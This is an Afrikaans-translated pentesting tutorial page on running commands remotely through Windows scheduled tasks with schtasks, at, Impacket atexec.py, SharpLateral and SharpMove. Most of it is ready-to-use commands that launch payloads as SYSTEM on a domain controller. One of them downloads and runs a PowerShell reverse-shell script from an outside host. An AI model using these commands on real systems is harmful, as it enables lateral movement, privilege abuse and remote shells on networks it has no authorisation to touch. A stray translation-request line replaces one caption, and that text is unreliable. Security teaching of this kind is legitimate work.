# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Hoe dit werk

Met administratiewe toegang tot 'n Windows-host kan 'n operator 'n geskeduleerde taak op afstand skep en begin. Die `/S`-opsie kies die afgeleë host, `/U` en `/P` verskaf geloofsbriewe vir die skep van die taak wanneer nodig, en `/RU` kies die account waaronder die taak loop. Die command waarna `/TR` verwys, moet op die afgeleë stelsel bestaan.<sup>[[1]](#references)</sup>

Die ouer `at`-command kan ook 'n command op 'n afgeleë host skeduleer wanneer die Schedule-service loop. Dit voer geskeduleerde jobs onder die service account uit, wat gewoonlik `SYSTEM` is:<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
Skep die taak en begin dit:
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
Plak asseblief die Engelse teks wat vertaal moet word.
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Vir 'n herhalende weeklikse taak, gebruik 'n geldige weeklikse skedule en spesifiseer die dag uitdruklik:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
'n Taakaksie kan PowerShell ook direk aanroep. Die volgende laboratoriumvoorbeeld laai 'n script af en voer dit uit; host die payload slegs op infrastruktuur wat vir die assessering gemagtig is:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Impacket se `atexec.py` outomatiseer afgeleë opdraguitvoering deur die Task Scheduler-diens en aanvaar wagwoord-, NTLM-hash- of Kerberos-verifikasie.<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
SharpLateral bied 'n geskeduleerde-taak-uitvoeringsmetode:<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
SharpMove bied nog 'n Task Scheduler-implementering:<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Meer inligting oor die [**gebruik van schtasks met silver tickets hier**](../active-directory-methodology/silver-ticket.md#host).

Verwyder testing tasks na gebruik:
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - sktasks create](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - `at`-opdrag](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
